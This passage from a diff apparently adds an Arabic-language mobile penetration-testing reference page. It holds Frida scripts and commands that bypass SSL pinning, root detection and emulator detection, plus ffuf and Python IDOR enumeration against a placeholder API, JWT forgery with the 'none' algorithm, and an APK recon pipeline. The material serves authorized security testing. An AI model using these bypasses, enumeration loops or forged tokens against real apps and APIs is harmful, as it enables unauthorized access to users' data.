+    Build.MANUFACTURER.value = "Google";
+    Build.HARDWARE.value = "walleye";
+
+    var SystemProperties = Java.use('android.os.SystemProperties');
+    SystemProperties.get.overload('java.lang.String').implementation = function (key) {
+        if (key === 'ro.hardware' || key === 'ro.kernel.qemu') return 'walleye';
+        return this.get(key);
+    };
+});</code></pre>
+<h3>سكريبت موحَّد يشغّل كل الـ bypasses مع بعض</h3>
+<pre><code>frida -U -f com.target.app \
+  -l universal-ssl-pinning-bypass.js \
+  -l root-detection-bypass.js \
+  -l emulator-bypass.js \
+  --no-pause</code></pre>
+
+<h2 id="s13"><span class="n">13</span>أتمتة اختبار الـ API</h2>
+<h3>اكتشاف endpoints من حركة Frida + تحويلها لمجموعة Postman</h3>
+<pre><code>// endpoint-collector.js — يسجل كل نداء OkHttp ويطبعه كـ curl جاهز
+Java.perform(function () {
+    var Request = Java.use('okhttp3.Request');
+    Request.url.overload().implementation = function () {
+        var url = this.url();
+        console.log('[endpoint] ' + this.method() + ' ' + url.toString());
+        return url;
+    };
+});</code></pre>
+<pre><code># حوّل اللوج الناتج لمجموعة curl، وشغّلها دفعة واحدة بـ newman بعد تجميعها Postman collection
+newman run collection.json -e environment.json --reporters cli,json</code></pre>
+<h3>Fuzzing سريع للـ Parameters بـ ffuf</h3>
+<pre><code>ffuf -u "https://api.target.com/v1/user/FUZZ" \
+  -w <(seq 1000 1050) \
+  -H "Authorization: Bearer $TOKEN" \
+  -mc all -fc 404 -o idor_results.json</code></pre>
+<h3>اختبار IDOR آلي بسكريبت Python بسيط</h3>
+<pre><code>import requests
+
+BASE = "https://api.target.com/v1/invoice/{}"
+TOKEN_A = "Bearer eyJ..."  # توكن مستخدم A
+
+for invoice_id in range(1000, 1050):
+    r = requests.get(BASE.format(invoice_id), headers={"Authorization": TOKEN_A})
+    if r.status_code == 200 and str(invoice_id) not in r.text[:50]:
+        print(f"[!] Possible IDOR: invoice {invoice_id} -> {r.status_code}")</code></pre>
+<h3>فحص JWT آليًا (alg confusion + فك الـ payload)</h3>
+<pre><code>import jwt, base64, json
+
+token = "eyJhbGciOi..."
+header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
+payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
+print("alg:", header.get("alg"), "| payload:", payload)
+
+# جرّب تزوير توكن بخوارزمية none (لو السيرفر بيقبلها)
+forged = jwt.encode(payload, key="", algorithm="none")
+print("forged token:", forged)</code></pre>
+
+<h2 id="s14"><span class="n">14</span>Pipeline شامل يجمع كل الخطوات</h2>
+<pre><code>#!/usr/bin/env bash
+# full_recon.sh — استطلاع وتحليل static آلي لأي APK في ثانية الأمر
+set -e
+APK=$1
+OUT="recon_$(basename "$APK" .apk)"
+mkdir -p "$OUT"
+
+echo "[*] Hash & basic info"
+sha256sum "$APK" | tee "$OUT/hash.txt"
+aapt dump badging "$APK" > "$OUT/badging.txt"
+
+echo "[*] Decompiling with jadx"
+jadx -d "$OUT/jadx" "$APK" --deobf -q
+
+echo "[*] Decoding resources with apktool"
+apktool d "$APK" -o "$OUT/apktool" -f -q
+
+echo "[*] Scanning for secrets"
+grep -rEn '(?:api[_-]?key|secret|password|token)\s*[:=]\s*["\x27][0-9a-zA-Z_\-]{16,}["\x27]' "$OUT/jadx/sources" \
+  > "$OUT/secrets.txt" || true
+
+echo "[*] Scanning for weak crypto"
+grep -rEn '(AES|DES|RSA)/ECB|MessageDigest.getInstance\("(MD5|SHA-1)"\)' "$OUT/jadx/sources" \
+  > "$OUT/weak_crypto.txt" || true
+
+echo "[*] Listing exported components"
+grep -E 'android:exported="true"' "$OUT/apktool/AndroidManifest.xml" > "$OUT/exported.txt" || true
+
+echo "[*] Uploading to local MobSF instance"
+HASH=$(curl -s -F "file=@$APK" http://localhost:8000/api/v1/upload -H "Authorization: $MOBSF_API_KEY" | jq -r .hash)
+curl -s -X POST http://localhost:8000/api/v1/scan -d "hash=$HASH" -H "Authorization: $MOBSF_API_KEY" > /dev/null
+curl -s -X POST http://localhost:8000/api/v1/report_json -d "hash=$HASH" -H "Authorization: $MOBSF_API_KEY" -o "$OUT/mobsf_report.json"
+
+echo "[+] Done. Results in $OUT/"</code></pre>
+<blockquote><p>شغّله بـ <code>./full_recon.sh target_app.apk</code> — بيطلعلك في دقايق: الأسرار المكشوفة، التشفير الضعيف، المكونات المكشوفة، وتقرير MobSF كامل، جاهزين للمراجعة اليدوية بدل ما تبدأ من صفر.</p></blockquote>
+
+<div class="eof">-- EOF: toolbox/mobile-pentest-practical-reference.md --</div>
+</main>
+</body>
+</html>
